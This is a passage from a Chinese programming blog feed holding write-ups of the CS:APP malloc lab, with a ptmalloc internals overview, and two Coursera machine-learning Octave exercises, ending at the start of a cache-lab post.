WSIZE, 0); // size &lt;= 256PUT(start + 5 * WSIZE, 0); // size &lt;= 512PUT(start + 6 * WSIZE, 0); // size &lt;= 1024PUT(start + 7 * WSIZE, 0); // size &lt;= 2048PUT(start + 8 * WSIZE, 0); // size &lt;= 4096PUT(start + 9 * WSIZE, 0); // size &gt; 4096PUT(start + 10 * WSIZE, 0); // for alignmentPUT(start + 11 * WSIZE, PACK(8,1)); // the prologue blockPUT(start + 12 * WSIZE, PACK(8,1));PUT(start + 13 * WSIZE, PACK(0,3)); // the epilogue blockstart_pos = start + 14 * WSIZE;start_link_list = start;end_link_list = start + 10 * WSIZE; extend_heap 关于堆的拓展，我们需要注意到，每次拓展的大小都应该为8的倍数，这样才能保证8字节对齐。 其次，在拓展的时候，可以有一个小优化。假设我们需要拓展的大小为size。拓展时，我们先查看位于堆顶端的块，如果堆顶端是一个空闲的块，并且大小为msize的话，我们可以只拓展size - msize即可。这样的话可以在一定程度上提高空间利用率(针对某些比较特殊的数据效果很明显)。当然，这样的话也会使得整个程序效率降低(频繁使用mem_sbrk的话对程序性能的影响是很大的，这是一个系统调用)。 link_list 在本实验中，为了使用best fit，我们选择采用将链表按照从小到大的顺序排序，然后从头开始遍历链表，当遇到第一个满足要求大小的块，这个块就一定是最适合我们的。因此，我们每次插入某一个块的时候，别忘了要遍历链表，然后将该块放到正确的位置上，以维护链表的单调性。 find_fit 在寻找能放得下size个字节的最小的块的时候，我们有两种处理策略。笔者采用的方法如下：遍历当前的链表，寻找是否有满足要求的块，有的话就返回。另一种方法是只遍历size所在的链表，如果没有，直接返回NULL，交由后面堆去拓展。 第一种方法的话很明显时间上效率较低，但是能够保证较大的块能够被使用。后一种方法的话时间上效率较高，但是可能导致较大的某个块一直无法被利用，从而导致了空间的浪费。 123456789101112131415// getSizeClass 返回当前的size 值对应在第几条链表上static void* find_fit(int size)&#123; char* link_begin = start_link_list + WSIZE * getSizeClass(size); while(link_begin != end_link_list) &#123; char* cur_node = LINK_NEXT(link_begin); while(cur_node != NULL &amp;&amp; GET_SIZE(HDRP(cur_node)) &lt; size) &#123; cur_node = LINK_NEXT(cur_node); &#125; if (cur_node != NULL) return cur_node; link_begin += WSIZE; &#125; return NULL;&#125; malloc &amp; free 如下。有几个要注意的点。首先，分配内存的时候，我们需要一个大小至少为WSIZE(allocated block的头部) + size的块，且最小为16。如果小于16的话，会导致free的时候放不下，从而出现问题。其次，注意好标志位。free的时候下一个块的第二个标志位应该清零。以及free的时候，要顺便看下前后能不能合并，可以合并的话应该合并完后再插入到链表当中。123456789101112131415161718192021222324void *mm_malloc(size_t size)&#123; size_t newsize = MAX(ALIGN(size + WSIZE), 16), incr; void* addr; // 这里我用findFitAndRemove寻找满足要求的块，找到的话顺便删除，没找到则返回NULL if ((addr = findFitAndRemove(newsize)) == NULL) &#123; incr = MAX(CHUNKSIZE, newsize); extend_heap(incr / DSIZE); addr = findFitAndRemove(newsize); &#125; return place(addr, newsize);&#125;void mm_free(void *ptr)&#123; size_t size = GET_SIZE(HDRP(ptr)); size_t prev_alloc = GET_PREV_ALLOC(HDRP(ptr)); AND(HDRP(NEXT_BLKP(ptr)), ~0x2); // 标志位清零 PUT(HDRP(ptr), PACK(size, prev_alloc)); PUT(FTRP(ptr), PACK(size, prev_alloc)); PUT(NEXT_PTR(ptr), NULL); PUT(LAST_PTR(ptr), NULL); coalesced(ptr); // 这个很重要，记得合并&amp;插入链表&#125; place 这个函数单独拿出来是我们的放置策略的问题。这里，参考了网上某位大牛的写法(如果涉及侵权，请联系我修改)。具体为什么要这样写，该文章中说得已经很清楚了。这种写法主要是为了对应binary-bal文件。这里简单概括一下。 其实核心思想就是将大的块放在右侧，小的块放在左侧，然后当大的块free掉之后，就能形成一个更大的块来存放。其实更多情况下这更像是一种针对数据造函数的思想，当然，如果数据更改或者是一些顺序更换，这样的写法就有时候反而会导致效率极度下降。1234567891011121314151617181920212223242526272829static void* place(void* ptr, size_t size)&#123; size_t all_size = GET_SIZE(HDRP(ptr)), res_size = all_size - size; if (res_size &lt; 16) &#123; OR(HDRP(NEXT_BLKP(ptr)), 0x2); size = all_size; PUT(HDRP(ptr), PACK(size, 0x3)); &#125; else if (size &lt; 96) &#123; char* new_block = (char*)ptr + size; PUT(HDRP(new_block), PACK(res_size, 0x2)); PUT(FTRP(new_block), PACK(res_size, 0x2)); PUT(NEXT_PTR(new_block), NULL); PUT(LAST_PTR(new_block), NULL); add_node(new_block, getSizeClass(res_size)); PUT(HDRP(ptr), PACK(size, 0x3)); &#125; else &#123; char* new_block = (char*)ptr + res_size; PUT(HDRP(ptr), PACK(res_size, 0x2)); PUT(FTRP(ptr), PACK(res_size, 0x2)); PUT(NEXT_PTR(ptr), NULL); PUT(LAST_PTR(ptr), NULL); add_node(ptr, getSizeClass(res_size)); PUT(HDRP(new_block), PACK(size, 0x3)); ptr = new_block; OR(HDRP(NEXT_BLKP(ptr)), 0x2); &#125; return ptr;&#125; realloc 关于这个函数，是因为它有比较多的可以优化的地方。trace文件中的最后两个测试如果不采用一定的优化的话，会导致空间利用率很低，甚至Out of memory。 首先，如果realloc的size比之前还小，那么我们不需要进行拷贝，直接返回即可(或者可以考虑对当前块进行分割) 其次，如果下一块是一个空闲块的话，我们可以直接将其占用。这样的话可以很大程度上减少external fragmentation。充分地利用了空闲的块。(前一个块是空闲的话并没有什么作用。还是需要将内容复制过去，因此不讨论) 接着，如果下一个块恰好是堆顶，我们可以考虑直接拓展堆，这样的话就可以避免free和malloc，提高效率。 最后，实在没有办法的情况下，我们再考虑重新malloc一块内存，并且free掉原先的内存块。这里要注意一下malloc和free的顺序，如果直接换过来的话可能导致错误。(free的时候有可能会把predecessor和successor的位置清为NULL，这里具体要看前面的函数是怎么写的。总之要小心一点。)12345678910111213141516171819202122232425262728293031323334353637383940414243void *mm_realloc(void *ptr, size_t size)&#123; if (size == 0) &#123; mm_free(ptr); return NULL; &#125; if (ptr == NULL) return mm_malloc(size); size_t oldBlockSize = GET_SIZE(HDRP(ptr)); size_t oldSize = oldBlockSize - WSIZE; if (oldSize &gt;= size) &#123; // 这里有另一种策略，如果realloc分配的内存过小，我们可以考虑对这个块进行分割，一定程度上提高了内存的利用率 return ptr; &#125; else &#123; size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr))); size_t next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr))); // 下一块内存是空闲的，并且和当前块大小加起来足够用，则占用下一块内存 if (!next_alloc &amp;&amp; next_size + oldSize &gt;= size) &#123; delete_node(ptr + oldBlockSize, getSizeClass(next_size)); OR(HDRP(NEXT_BLKP(NEXT_BLKP(ptr))), 0x2); PUT(HDRP(ptr), PACK(next_size + oldBlockSize, GET_PREV_ALLOC(HDRP(ptr)) | 0x1)); return ptr; &#125; // 下一块内存刚好是堆的顶部，直接拓展即可。可以不用free后再malloc。 if (NEXT_BLKP(ptr) == start_pos) &#123; size_t newsize = ALIGN(size - oldSize); if (mem_sbrk(newsize) == (void*)-1) return NULL; PUT(HDRP(ptr), PACK(oldBlockSize + newsize, GET_PREV_ALLOC(HDRP(ptr)) | 0x1)); start_pos += newsize; PUT(HDRP(start_pos), PACK(0, 0x3)); return ptr; &#125; void *newptr = mm_malloc(size); if (newptr == NULL) return NULL; memcpy(newptr, ptr, oldSize); mm_free(ptr); return newptr; &#125;&#125; something else 这个实验如果要拿到满分的话，可能还是得针对具体的数据设置恰当的自定义数据结构来完成。这里笔者实在无能为力了，只能简单提一下几种常见的思路吧。 首先还是说一下按照上述方法写，如果不出意外的话，应该是有95分以上的，但是我们会发现，这种写法存在这一些弊端。首先是一些讨论明显是针对测试数据而设计的，如果测试数据更改，那么整个程序的效率就会大打折扣。其次，我们采用将各个块根据大小分组的话会出现一些问题。比如random-bal文件中，alloc的数据大多数都很大(大于4096)，或者实际应用中，多次申请相同大小的内存，它们将被放在同一个链表当中。如果分配后迟迟没有free的话，会导致链表越来越长，从而使得效率越来越低。这里有一种优化方式就是采用BST来进行维护。我们将所有大小相同的块组织成一个链表，BST中的每一个节点即为链表的表头，当某一个大小的块全部用完的时候，则将其从BST中删除，这样，插入和查找，搜索的效率均为O(log2n)。 具体的每个free块结构如下1234567891011121314151617struct block &#123; // 头部块 unsigned size_head:29; unsigned flag_head:3; // 链表的下一个节点和上一个节点 block* pred; block* succ; // 树的左儿子，右儿子和父亲 block* left; block* right; block* father; payload... // 尾部块 unsigned size_foot:29; unsigned size_foot:3;&#125; 当然，采用BST的话，理论上我们运行的速度会快很多，然而，这还是有问题。BST并不能保证效率为O(log2n)，当某些情况下，比如每一次分配的大小都恰好比上次多一点点，这样的话就会导致效率急剧下降，整个BST退化成了链表。为了解决这个办法，可以采用平衡树，这使得整体的各种操作的效率会更加趋近于O(log2n)。 至于空间效率方面的话，若要拿到满分，除了根据数据再进行一些特定的判断以外，笔者暂时想不到更好的办法了。如果你有一些更好的办法，请务必告诉我。 最后，如果有需要的话，欢迎到我的github上查看详细文件。 关于ptmalloc 既然我们前面已经讲述了如何自己手动模拟一个allocator，那么我们不妨来简单地看看真正的malloc函数究竟是怎么样的吧！ 参考资料: https://blog.csdn.net/z_ryan/article/details/79950737 chunk malloc中chunk的定义和我们的malloc lab颇为相似。具体定义在malloc.c文件中。其中，最后的两个next_size指针用于比较大的块中，当同一个大小的块较多时，线性遍历比较浪费时间，因此用next_size，指向下一个大小的块。 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 同样的，共有两种不同类型的chunk，第一种是已被占用的chunk，另一种是空闲的chunk，在malloc.c中，结构如下：12345678910111213141516171819202122232425262728293031323334// allocated chunkchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+// free chunkchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其中，由于我们的块使用的是8字节对齐，因此，块的大小的最后3位一定是0。因此，我们同样可以把这三位利用起来。其中，最后一位P表示上一个块是否被占用，倒数第二位M表示该块是否来自于mmap函数，倒数第三位A表示当前块是否位于非主分配区。 分配区 在malloc中，共有两种分配区。第一种是MAIN_ARENA，即主分配区，初始时进行内存分配均在主分配区中。第二种是NON_MAIN_ARENA，即非主分配区。初始时仅有主分配区。分配区具体和线程相关，当某个线程想要使用malloc获取一段内存时，在有采用多线程的情况下，会先使用arena_get获得当前线程所在的分配区，并且，为该分配区加上互斥锁。该宏定义如下： 1234567891011#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0)#define arena_lock(ptr, size) do &#123; \ if (ptr) \ __libc_lock_lock (ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) 倘若从该分配区上没有分配到所需的内存时，尝试从其他分配区中获取内存。如果找不到一个未加锁的分配区，则使用mmap增加一个非主分配区，并在该分配区上分配内存。 bins 在malloc中，由于块之间是用链表串起来的，每一条链表我们称之为bin。其中，每个bin中的大小比较接近，并且bin中的块按照大小排序，当大小相同时，则按照使用是否最近刚使用过排序，类似于LRU。在malloc中，总共有128个bin，按照大小等因素分类，总共有以下四种bin: Fast bin Unsorted bin Small bin Large bin 各个相邻bin间的大小间隔如下： 64 bins of size 8 32 bins of size 64 16 bins of size 512 8 bins of size 4096 4 bins of size 32768 2 bins of size 262144 1 bin of size what’s left Fast bin fast bin中存放的是大小小于64B的chunk，用于处理程序在运行过程中申请的较小的内存空间。通常情况下，fast bin中即使两个块相邻也不会主动合并(合并后如果malloc又申请了一些较小的内存，那么需要再次进行分割，耗费时间)。各个bin存放的块的大小以8B递增，同时，每一个bin中块的大小相同，分配时直接从头部摘除，同理，free的时候直接连接在了头部，加快了分配的效率。 在分配时，malloc优先从fast bin中寻找大小恰当的块。 Unsorted bin unsorted bin是bins的缓冲区，如同其名字所示，其中存放的bin的大小任意，并且也不需要按照大小顺序排序，当在small bin中找不到合适大小的块的时候，会在该bin中查找。当用户释放内存，或者fast bin合并后，或者发生了分割后剩下的块，会优先进入该bin。并且，查找后，把unsorted bin中的块放进对应的small bin或者large bin中。 Small bin small bin中存放的是大小大于64B，小于512B的块，每个bin内的块大小相同，相邻的块之间大小相差8B。链表具体的各种操作和fast bin类似，不过两个相邻的块之间会发生合并，以减少碎片的产生。 Large bin large bin中存放的是大小大于512B的块，其中，每个bin内块的大小不一，按照大小递减排序，大小相同则按照近期是否使用排序。分配时，完全遵循best fit，即满足大小要求的最小的块。分配后，会进行切割，剩下的块加入unsorted bin当中。 else 除了上面几种bin，还有一些比较特殊的块，不包含在任何一个bin当中。 大小超过128kb的块，将直接使用mmap函数。并且，所有M标记位为1的块，其他的标记位将被忽略，同时，这些块也不会进入到bin当中，当使用free函数时，这些块将直接通过unmmap还给操作系统 top chunk。这是一个特殊的块，位于堆的顶部。当所有的bin中的块的大小都不满足要求时，将会使用这个chunk。(注意，这依然满足best fit，top chunk被视为无限大)。如果top chunk的大小仍然不够，则会根据所需的大小使用mmap或者sbrk来拓展。 malloc &amp; free 当我们调用malloc函数时，首先调用的是__libc_malloc函数，该函数做一些判断处理的工作，最后，malloc的具体实现逻辑交由__int_malloc函数执行。具体步骤如下： 若是多线程，需要获取分配区的指针并上锁。否则跳过 计算所需的块的实际大小 如果所需的块大小小于fast bin的阈值，尝试从fast bin中获取。若获取失败，进入下一步。 若所需的块的大小位于small bin中，尝试从small bin中获取，若获取失败，进入第6步。若块的大小不位于small bin中，进入下一步。 调用malloc_consolidate函数，对fast bin进行拆除和合并，并扔进unsorted bin中。 进入循环，尝试从unsorted bin中获取，能获取到大于所需大小的，则进行切割并返回。同时，unsorted bin中大小位于small bin和large bin的块分别扔对应的bin中。 从large bin中按best fit查找，如果找到，则切割并返回。 从top chunk中获取，若top chunk 满足要求，则进行切割。若不满足要求，则扩容 总之，对于某一个特定的请求，执行的顺序大致为： fast bin -&gt; small bin -&gt; unsorted bin -&gt; large bin -&gt; top chunk -&gt; extend_heap 当我们调用free函数时，整体的过程也是类似的。 首先，进行一些特殊判断后。如果该块属于mmap映射得到(M标志位)，直接unmmap还给操作系统。否则，进入下一步。 获取分配区的指针。大小如果小于fast bin的阈值，直接放入其中。如果下一个chunk也是空闲，则触发合并操作，并扔入unsorted bin中。大小如果大于该阈值，则放入unsorted bin中，并且检查是否需要合并。 倘若当前块与top chunk相邻，则与top chunk合并。并且，对于主分配区，top chunk如果大于收缩阈值(128KB)，则归还一部分给操作系统。 summary 这个实验难度真的比较大。很多东西都没有提供，要靠自己写。并且，对于这个实验来说，非常容易出现segment fault，并且调试难度很大。像笔者花在调试上面的时间真的很多，常常因为漏打了标记之类的出错，然后就一直检查不出来了，很花时间。当然，这个时间我觉得的话还是很值得的，起码锻炼了自己调试的能力。建议如果要做这个实验的话，可以试着每过一段时间就保存一下，尤其是正确通过测试的时候，把文件复制到别的地方，然后再继续做一些优化，这样出了问题我们还可以比较一下。 转眼之间这个已经是倒数第二个实验了，寒假也已经到了尾声。这个时候还是希望自己不要太焦躁，开学了，心态也要放好一点，这样才能更好地进步。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>memory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-learning-ex2]]></title>
    <url>%2F2019%2F02%2F09%2FMachine-learning-ex2%2F</url>
    <content type="text"><![CDATA[序 这个系列是关于coursera上吴恩达的machine learning课程的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 3的编程练习。 关于任务提交，octave的安装中的一些小问题，在上一篇文章中已经有所提及，这里不再赘述。 任务正文 其实上一期任务如果能顺利做下来的话，这一周的任务应该算是很简单的了。基本上照着教程走就没有任何问题了，这里可能着重提一下一些其他的点吧。 需要填写的文件有： sigmoid.m 对每个元素求g(x) = 1 / (1 + e^(-x))plotData.m 将数据可视化costFunction.m 计算代价函数以及梯度predict.m 对给定的theta和X，计算预测值(0 或 1)costFunctionReg.m 计算正则化的代价函数以及梯度 plotData.m 这个函数同样的，我们只要照着pdf打即可。注意其中find函数的用法，可以直接获得向量y中所有y=1或y=0的位置 pos = find(y==1);neg = find(y==0);plot(X(pos, 1), X(pos, 2), ‘k+’, ‘LineWidth’, 2, ‘MarkerSize’, 7);plot(X(neg, 1), X(neg, 2), ‘ko’, ‘MarkerFaceColor’, ‘y’, ‘MarkerSize’, 7); sidmoid.m 按照公式打即可。 g = 1 ./ (1 + exp(-z)); 注意’./‘符号作用是用1去除以向量z中的所有元素，得到另一个和z维度相同的向量。exp(x)用于求ex。 另，关于这个g(x)函数，也就是logistic regression和linear regression的一个重要区别。因为在logistic regression，用h(x)表示预测值的话，h(x)的范围应该在(0, 1)当中，且应该是关于y轴上某一点对称。然后我们发现，g(x) = 1 / (1 + e-x)满足了我们所有的需求。当然，这里笔者有个问题，既然我们能采用这个函数来对数据进行转换，我们是不是也可以找到另一个同样满足要求的函数替换掉g(x)呢？ costFunction 在logistic regression中我们用h(x)=g(θTX)代替了h(x)=θTX。并且，我们不再采用平方差的形式，而是使用了log的形式，并且，对于y==0或者y==1的情况的计算公式应该是有区别的，因此，最后采用了这样的计算方法 为了更便于我们的计算，我们将这两个公式合并在一起，就变成了下面的公式。当y==0或y==1时，这个公式分别变成了上面的两个公式。 然后，就是关于梯度的计算。和之前的做法其实是一样的。如果不能理解的话还是建议画图。 具体计算方法如下： z = X * theta;h = sigmoid(z);J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ mgrad = X’ * (h - y) / m; prediction 对于给定的theta和X，我们可以求得当前theta和数据集的情况下θTX的值，我们知道当x大于等于0.5的时候，我们得到的预测值为1，否则预测值为0。由此可以得到以下的写法： p = sigmoid(X * theta);p(find(p &gt;= 0.5)) = 1;p(find(p &lt; 0.5)) = 0; costFunctionReg 对于正则化下的代价函数，难度稍微增大了一些。 首先是J的计算。和之前相比，现在的代价函数多了一个平方项，由于这一个项的存在，当足够多次的迭代过后，theta总会趋向与0，这就使得在预测函数中，某些项的系数会很快地趋近于0，这样就相当与去掉该项，从而避免了过拟合(overfit)的发生。当然，lambda的值必须取好一点。若取值过大，则会导致前面的log项的作用被稀释，甚至被忽略。最后导致求得的结果连我们给定的数据集都没办法拟合。若取值过小，起不到相应的作用，函数千方百计地拟合我们给定的数据集，使得曲线十分奇怪，过拟合依旧会发生。 接着，是梯度值的计算。为了向量化计算，这里引入了mtheta变量，其中除了第一个位置以外和theta完全相同，即θ0=0。这样的话，在计算的时候就不会造成影响。注意到正则化是不会对去涉及θ0=0的，笔者一开始在这里没注意，导致预测值出现了问题。 mtheta = theta;mtheta(1) = 0; z = X * theta;h = sigmoid(z);J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ m + mtheta’ * mtheta * lambda / (2 * m); grad = X’ * (h - y) / m + mtheta * lambda / m; 总结 整体上来说，这个练习确实是偏简单了一些，更多的可能是想让我们稍微了解一下该如何去实现某一个特定的算法而已。当然，这个练习中还没有涉及multiple-class的情况，如果有的话，难度应该会更上一层了。接下来下一个周貌似就有相关的练习了，并且将要涉及到Neural Networks的一些东西了。加油吧。]]></content>
      <categories>
        <category>machine learning</category>
      </categories>
      <tags>
        <tag>machine learning</tag>
        <tag>coursera</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-learning-ex1]]></title>
    <url>%2F2019%2F02%2F03%2FMachine-learning-ex1%2F</url>
    <content type="text"><![CDATA[序 这个系列是关于coursera上吴恩达的machine learning课程的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 2的编程练习。 为什么要写这个系列？ 恩，可能只是一时冲动而已吧。首先，通过前面写的关于csapp系列文章，笔者觉得还是应该养成一个写博客的习惯吧。虽说写博客花的时间真的挺多的(前面的那几篇文章基本上至少半天，多的话要写一天甚至更多)，但很明显还是能感觉得到写完博客之后对于知识的理解还是更加清楚了一些，基本上重新看一遍能够回想起当时做的时候的思路历程。并且尽管这个教程算是很有名了，但是网上的一些资料质量还是参差不齐，不少都有着各种各样的问题。因此，笔者决定自己来写这个系列，一是为了加深理解，便于日后重新回顾，二是希望能够给恰好点开了这篇文章的同学一点点帮助。当然，由于笔者目前水平有限，且笔者也是第一次接触机器学习，难免会出现各种各样小问题，如果你发现了一些问题，也欢迎与我联系(点击右下角的小图标即可，可能要稍微等一会)。 Octave 的安装问题 笔者的系统为 archlinux: 4.20.0 在安装过程中，出现了一些找不到共享库的情况，类似于这样的错误： error while loading shared libraries: libxxx.so 遇到这种错误的时候，其实安装对应的库就行了，比如libreadline.so的库名称为readline。直接用对应的系统的下载命令即可。(笔者用的是 yay xxx命令)。不过，安装的时候记得看清楚提示，笔者就是因为没注意提示然后导致libreadline.so库丢了，然后开机都没办法，最后还是用U盘上的系统把这个库拷贝过来才解决的。 任务正文实验如何提交 首先，在octave下，进入ex1文件夹中(octave可以使用linux系统的ls, cd命令)，然后直接输入submit即可，顺利的话很快就可以看到结果。做完所有任务的话看到的信息应该是这样: 不过，笔者在octave中，submit后就直接卡住了，应该是网络的问题，被墙了。笔者采用的解决办法是使用proxychains代理运行octave，然后submit就成功了。不同系统的话解决办法不一定相同，但总之注意好代理应该就可以了。下载的时候也是，笔者是采用proxychains + curl命令直接下载文件的。 one feature 这个实验我们必须完成的函数仅为一个特征的情况，难度较小。one feature下我们需要填写的文件有： warmUpExercise.m 用于练习submitplotData.m 用于data的可视化computeCost.m 计算代价函数J(theta)gradientDescent.m 实现梯度下降算法 主要是为了测试一下submit能否正常运行。其中，第一个文件答案仅一行(注意不要漏了分号)。1A = eye(5); 第二个文件答案只要照着pdf打即可。123plot(x, y, 'rx', 'MarkerSize', 10);ylabel('Profit in $10,100s');xlabel('Population of City in 10,000s'); 注意，其中plot的用法(可以输入help plot查看)。’r’表示红色，同理可以换成’b’,’g’等。’x’表示用X来展示每个数据，同理可以换成’o’，表示用圆圈来展示等。最后’markerSize’表示每个标记的大小为10，可以修改这个数字自己看一下效果，也可以输入’LineWidth’，’color’等，具体效果可以自行尝试。 代价函数的计算 这里代价函数计算单特征和多特征的写法是一样的，因此放在一起写。请务必保证每一步都可以理解清楚，建议画图加深理解。 首先，我们观察hθ(x)的计算公式： 用X表示我们的m * (n+1)的数据集，其中，m表示example数量，n表示特征数量，则X是一个m * (n+1)的矩阵。 用theta表示我们当前的变量theta，时刻记住，theta是一个n维的向量(m * 1)，n与特征数相对应。因此，用向量化的思想，h(x)即可以表示为X * theta，注意矩阵乘法是不可交换的。相乘之后我们得到一个m维的向量，即m个example各自对应的预测值，再减去实际值y(y同样是一个m维的向量)，即得到我们误差向量c。 而最后我们要的应该是每一个误差的平方再除以2m，可以用c’和c相乘即可。 最后的答案为(c’ * c 也可以写成 sum (c .* c)，没有区别)。 c = X * theta - y;J = c’ * c / (2 * m); 梯度下降算法的实现 梯度下降算法多特征理解起来可能还是有一点难，强烈建议画图，并且通过图好好理解。 首先，还是先来看一下公式。对第j个theta，我们要进行如下的更新，而且所有的theta应该同时更新。注意，具体计算的时候，我们把theta看成是一个n + 1维的向量。 即我们可以看成： 这个时候别忘了，在上面的公式中，我们的变量是theta，也就是说，i可以理解成是一个常数。右边的x(i)应该也是和theta对应的一个m维的向量，而X即我们的数据集。而i是常数，因此，hθ(x(i)) - y(i)也是一个常数。hθ(x)-y应该是一个m维的向量。 用c表示该向量，则X’ * c 即可以表示上面的公式中sigma右边试子的值。 因此，最后的答案为: c = X * theta - y;theta = theta - X’ * c * alpha / m; 两个文件写完之后，我们可以运行ex1，查看我们的结果和预期的结果是否相同，最后成功的话应该可以看到一条直线基本上能拟合我们的数据，说明应该是成功了。这个时候我们就可以submit上去了。 multiple features 这个练习后面又有一个选择性的练习，即多特征下的梯度下降，整体思路其实很相似。 对于多个特征的数据，很多情况下，我们需要先将其标准化，以减少迭代次数。这里，我们使用mean和std函数帮助我们的计算。 mu = mean(X);sigma = std(X);X_norm = (X - mu) ./ sigma; 其中，X为我们的数据集，而X中的每一列即表示我们某一个特征的所有数据。mean(X)求出矩阵X每一列的平均值，存储在向量mu中。std(X)求出每一列的标准差，存储在向量sigma中。最后对X中的每一列，每一行的数字减去该列的平均值，再除以方差即完成标准化的步骤。 然后，我们需要完成computeCostMulti.m 和 gradientDescentMulti.m 文件，实现多特征的梯度下降算法，具体写法上面已经有写，这里不再赘述。倘若没有问题，输入ex1_multi后，我们应该可以看到以下的输出： 然后，我们需要修改ex1_multi中的值，有h(x)的计算公式，我们很容易得到price应该是： price = [1,1650,3] theta; 好了，这个时候我们倘若运行，会发现预测得到的price极其大，而我们通过看几个数据，发现price应该是在30w上下的，是我们梯度下降做错了吗？其实并不是，这里有一个坑。我们前面用到了特征的归一化，而对于我们要预测的值，我们并没有进行处理，这个时候得到的答案显然就是错误的。正确的答案应该是： price = [1,([1650,3] - mu) ./ sigma] * theta; 注意，计算mu和sigma的时候我们还没有的x0还没有加上去。因此预测值向量应该是[1,([1650,3]-mu) ./ sigma]。最后得到的答案是29w多一点。 接着，文档中又给出了一个选择alpha的测试，有兴趣的话可以改一下ex1_multi中的alpha变量，看一下收敛需要的迭代次数的变化。 最后，是一个标准方程的测试，我们将公式直接输入进去即可。具体原理暂时不懂，等学完线性代数再去理解吧。 theta = pinv(X’ * X) * X’ * y; 最后 到这里，整个实验的所有题目就结束了，然而这样真的就全部完了吗？笔者还发现了一个小细节，不知道是不是作者故意留下来的。如果你写法和我一样的话，你可能也会看到这样的输出： 我们发现，梯度下降得到的答案和标准方程得到的答案有一定的差异。这个应该就算是误差了，当迭代次数越来越多的时候，梯度下降得到的值应该会越来越可靠。从预测值中我们看到，虽然有误差，但其实还可以接受。然而，我们看一下两种方法得到的theta，差别却非常大。这说明了我们用梯度下降算法得到的应该是某一个局部最优解，而这个局部最优解和全局最优解差别很小。]]></content>
      <categories>
        <category>machine learning</category>
      </categories>
      <tags>
        <tag>machine learning</tag>
        <tag>coursera</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Cachelab]]></title>
    <url>%2F2019%2F01%2F29%2Fcsapp-Cachelab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第六篇文章。具体题目请见官网。本文主要讲csapp中的cache lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。如果有时间的话，也可以看一下web aside里面blocking相关的一些知识，对于理解题目思路有一定帮助。 cache lab 这个实验总共只有两个部分，part A 要求我们写一个cache simulator, 总体来说比较简单，注意好各个指令间的区别就可以了。part B 是要求我们在特定的条件下对矩阵转置进行适当的优化，有一定难度。 主要实验文件traces 文件夹 存放用于part A测试的一些文件csim.c 完成part A 需要填写的文件trans.c 完成part B 需要填写的文件test-csim 和 test-trans 分别用于对part A 和 part B的测试driver.py 用于对part A 和 part B 整体进行测试 实验目的：part A 主要加深了我们对于缓存的理解，要求能够理解最简单的缓存在机器中是怎样实现的，能够解决写入缓存，读取缓存的一些问题。part B 主要通过优化转置这个任务，加深我们对cache miss的理解，懂得如何尽量减少cache miss 的产生，以提高程序效率。 实验正文part A part A 